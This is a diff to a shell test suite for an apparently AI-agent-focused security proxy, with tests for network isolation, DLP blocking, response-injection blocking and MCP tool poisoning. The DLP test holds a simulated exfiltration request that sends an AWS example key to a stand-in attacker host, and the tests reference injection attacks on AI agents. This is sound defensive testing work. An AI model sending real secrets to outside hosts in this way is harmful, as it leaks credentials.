@@ -19,6 +19,17 @@ pass() { PASS=$((PASS + 1)); printf '\033[32m  [PASS]\033[0m %s\n' "$1"; }
 fail() { FAIL=$((FAIL + 1)); printf '\033[31m  [FAIL]\033[0m %s\n' "$1"; }
 step() { printf '\n\033[1m--- %s ---\033[0m\n' "$1"; }
 
+# -- Test 0: CI verifies the binary came from the checked-out tree -----------
+if [ -n "${PIPELOCK_VERIFY_COMMIT:-}" ]; then
+  step "Test 0: Verify the mounted binary came from this checkout"
+  VERSION_OUTPUT=$(/pipelock version 2>&1) || true
+  if printf '%s\n' "$VERSION_OUTPUT" | grep -Fq "git commit: $PIPELOCK_VERIFY_COMMIT"; then
+    pass "Pipelock binary matches commit $PIPELOCK_VERIFY_COMMIT"
+  else
+    fail "Pipelock binary does not match commit $PIPELOCK_VERIFY_COMMIT"
+  fi
+fi
+
 # -- Test 1: Network isolation ------------------------------------------------
 step "Test 1: Verify container cannot reach attacker network directly"
 if wget -q -T 3 -O /dev/null "$ATTACKER/" 2>/dev/null; then
@@ -29,10 +40,11 @@ fi
 
 # -- Test 2: Proxy works ------------------------------------------------------
 step "Test 2: Fetch through pipelock proxy succeeds"
-# Use a path that returns clean content (no injection patterns).
-# The attacker's 404 page is just "File not found" — safe to proxy.
+# Use a path that returns clean content with HTTP 200.
 RESP=$(wget -q -T 10 -O - "$PIPELOCK/fetch?url=$ATTACKER/healthz" 2>/dev/null) || true
-if printf '%s' "$RESP" | grep -q '"status_code"'; then
+if printf '%s' "$RESP" | grep -Fq '"status_code":200' &&
+  printf '%s' "$RESP" | grep -Fq '"content":"quickstart-upstream-ok\n"' &&
+  printf '%s' "$RESP" | grep -Fq '"blocked":false'; then
   pass "Pipelock proxied request to attacker successfully"
 else
   fail "Pipelock did not proxy the request (response: $RESP)"
@@ -44,10 +56,12 @@ step "Test 3: DLP blocks secret in URL"
 # wget -S prints HTTP status to stderr; blocked requests return 403.
 DLP_URL="$ATTACKER/?key=AKIA""IOSFODNN7EXAMPLE"
 DLP_HEADERS=$(wget -S -T 10 -O /dev/null "$PIPELOCK/fetch?url=$DLP_URL" 2>&1) || true
-if printf '%s' "$DLP_HEADERS" | grep -q '403'; then
+DLP_STATS=$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null) || true
+if printf '%s' "$DLP_HEADERS" | grep -q '403' &&
+  printf '%s' "$DLP_STATS" | grep -Fq '"name":"core_dlp"'; then
   pass "DLP blocked AWS key in URL (HTTP 403)"
 else
-  fail "DLP did not block the secret (headers: $DLP_HEADERS)"
+  fail "DLP did not block the secret (headers: $DLP_HEADERS, stats: $DLP_STATS)"
 fi
 
 # -- Test 4: Response injection blocked -----------------------------------------
@@ -55,10 +69,12 @@ step "Test 4: Response scanning blocks injection"
 # With action=block, pipelock returns HTTP 403 when injection is detected.
 # wget -S prints HTTP status to stderr; we check for 403 just like Test 3.
 INJ_HEADERS=$(wget -S -T 10 -O /dev/null "$PIPELOCK/fetch?url=$ATTACKER/" 2>&1) || true
-if printf '%s' "$INJ_HEADERS" | grep -q '403'; then
+INJ_STATS=$(wget -q -T 10 -O - "$PIPELOCK/stats" 2>/dev/null) || true
+if printf '%s' "$INJ_HEADERS" | grep -q '403' &&
+  printf '%s' "$INJ_STATS" | grep -Fq '"name":"response_scan"'; then
   pass "Response injection blocked (HTTP 403)"
 else
-  fail "Response injection not blocked (headers: $INJ_HEADERS)"
+  fail "Response injection not blocked (headers: $INJ_HEADERS, stats: $INJ_STATS)"
 fi
 
 # -- Test 5: MCP tool poisoning detected ---------------------------------------
